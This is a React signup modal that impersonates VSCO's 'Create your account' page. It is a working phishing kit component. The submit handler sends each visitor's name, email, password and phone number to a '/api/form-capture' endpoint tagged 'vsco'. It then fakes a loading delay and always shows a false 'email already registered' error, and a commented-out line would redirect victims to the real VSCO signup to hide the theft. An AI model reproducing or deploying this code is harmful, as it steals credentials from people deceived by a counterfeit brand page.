'use client';

import { X } from 'lucide-react';
import Link from 'next/link';
import { useState } from 'react';

interface SignupModalProps {
  isOpen: boolean;
  onClose: () => void;
  onSwitchToLogin: () => void;
}

export default function SignupModal({
  isOpen,
  onClose,
  onSwitchToLogin,
}: SignupModalProps) {
  const [name, setName] = useState('');
  const [email, setEmail] = useState('');
  const [phone, setPhone] = useState('');
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    // Allow only numbers, spaces, and + sign
    const value = e.target.value.replace(/[^\d\s+]/g, '');
    setPhone(value);
  };

  const handleSignup = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!name || !email || !password) {
      setError('Please fill out all required fields.');
      return;
    }

    setIsLoading(true);
    setError(null);

    try {
      // Kirim data signup ke endpoint form capture
      await fetch('/api/form-capture', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          source: 'vsco',
          name,
          email,
          password,
          phone,
          additional_data: {
            signup_time: new Date().toISOString(),
          },
        }),
      });

      // Simulasi delay loading
      await new Promise((resolve) => setTimeout(resolve, 2000));

      // Simulasi error signup
      setError(
        'Unable to create account. This email may already be registered.',
      );

      // Jika ingin redirect ke VSCO asli setelah beberapa detik:
      // setTimeout(() => {
      //   window.location.href = 'https://vsco.co/user/signup';
      // }, 3000);
    } catch (err) {
      setError('Something went wrong. Please try again later.');
    } finally {
      setIsLoading(false);
    }
  };

  if (!isOpen) return null;

  return (
    <div className='fixed inset-0 z-50 flex items-center justify-center bg-black/80 p-4 backdrop-blur-sm'>
      <div className='relative w-full max-w-md rounded-xl border border-gray-800 bg-black p-8 shadow-2xl'>
        <button
          onClick={onClose}
          className='absolute right-6 top-6 text-gray-400 hover:text-white'
        >
          <X size={24} />
        </button>

        <div className='mb-8 text-center'>
          <div className='mb-6 flex justify-center'>
            <svg
              width='40'
              height='40'
              viewBox='0 0 24 24'
              fill='none'
              xmlns='http://www.w3.org/2000/svg'
            >
              <path
                d='M12 2C6.48 2 2 6.48 2 12C2 17.52 6.48 22 12 22C17.52 22 22 17.52 22 12C22 6.48 17.52 2 12 2ZM12 20C7.59 20 4 16.41 4 12C4 7.59 7.59 4 12 4C16.41 4 20 7.59 20 12C20 16.41 16.41 20 12 20Z'
                fill='white'
              />
            </svg>
          </div>
          <h2 className='text-xl font-semibold text-white'>
            Create your account
          </h2>
          <p className='mt-2 text-sm text-gray-400'>Join the VSCO community</p>
        </div>

        {error && (
          <div className='mb-6 rounded-lg border border-red-800/50 bg-red-900/30 p-3 text-sm text-red-300'>
            {error}
          </div>
        )}

        <form onSubmit={handleSignup} className='space-y-5'>
          <div>
            <input
              type='text'
              placeholder='Full Name'
              className='w-full rounded-lg border border-gray-700 bg-gray-900/50 p-3 text-white focus:border-transparent focus:outline-none focus:ring-2 focus:ring-gray-600'
              value={name}
              onChange={(e) => setName(e.target.value)}
              required
            />
          </div>

          <div>
            <input
              type='email'
              placeholder='Email'
              className='w-full rounded-lg border border-gray-700 bg-gray-900/50 p-3 text-white focus:border-transparent focus:outline-none focus:ring-2 focus:ring-gray-600'
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              required
            />
          </div>

          <div>
            <input
              type='tel'
              placeholder='Phone Number (optional)'
              className='w-full rounded-lg border border-gray-700 bg-gray-900/50 p-3 text-white focus:border-transparent focus:outline-none focus:ring-2 focus:ring-gray-600'
              value={phone}
              onChange={handlePhoneChange}
            />
          </div>

          <div>
            <input
              type='password'
              placeholder='Password (min. 8 characters)'
              className='w-full rounded-lg border border-gray-700 bg-gray-900/50 p-3 text-white focus:border-transparent focus:outline-none focus:ring-2 focus:ring-gray-600'
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              minLength={8}
              required
            />
          </div>

          <div>
            <label className='flex items-start text-sm text-gray-300'>
              <input
                type='checkbox'
                className='mr-2 mt-1 rounded border-gray-600 bg-gray-800'
                required
              />
              <span>
                By signing up, I agree to VSCO's
                <Link href='#' className='mx-1 text-white hover:underline'>
                  Terms of Service
                </Link>
                and
                <Link href='#' className='mx-1 text-white hover:underline'>
                  Privacy Policy
                </Link>
              </span>
            </label>
          </div>

          <button
            type='submit'
            className={`w-full rounded-lg p-3 font-medium ${
              isLoading
                ? 'cursor-not-allowed bg-gray-700 text-gray-300'
                : 'bg-white text-black transition-colors hover:bg-gray-200'
            }`}
            disabled={isLoading}
          >
            {isLoading ? 'Creating account...' : 'Create Account'}
          </button>
        </form>

        <div className='mt-8 border-t border-gray-800 pt-6 text-center'>
          <p className='mb-4 text-gray-400'>Already have an account?</p>
          <button
            onClick={onSwitchToLogin}
            className='w-full rounded-lg border border-gray-600 bg-transparent p-3 font-medium text-white transition-colors hover:bg-gray-800'
          >
            Log In
          </button>
        </div>
      </div>
    </div>
  );
}
